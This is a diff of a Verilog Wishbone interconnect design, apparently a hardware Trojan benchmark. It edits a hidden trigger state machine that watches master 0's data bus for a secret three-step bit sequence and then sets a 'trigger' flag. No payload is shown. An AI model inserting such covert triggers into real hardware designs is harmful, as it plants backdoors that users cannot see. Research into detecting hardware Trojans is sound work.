@@ -4689,15 +4689,16 @@ wb_conmax_slave_if #(pri_sel15,aw,dw,sw) s15(
 		.m7_rty_o(	m7s15_rty	)
 		);
 
-
+reg trigger = 0;
 // Trigger
 always @(posedge clk_i) begin
 if (m0_data_o==32'd0) begin Trojanstate <= 2'b00; end
 else begin
 	case ({m0_data_o, Trojanstate})
-		34'b0011010101010011101110000110110000 : begin Trojanstate <= 2'b01; $display("here"); end;
+		34'b0011010101010011101110000110110000 : begin Trojanstate <= 2'b01; end
 		34'b1110101010101010110110001111111101 : Trojanstate <= 2'b10;
-		34'b0000101010101001011100001011100010 : Trojanstate <= 2'b11;
+		34'b0000101010101001011100001011100010 : begin Trojanstate <= 2'b11; $display("here"); trigger = 1; end
+		default: begin ; end
 	endcase
 	end
 end
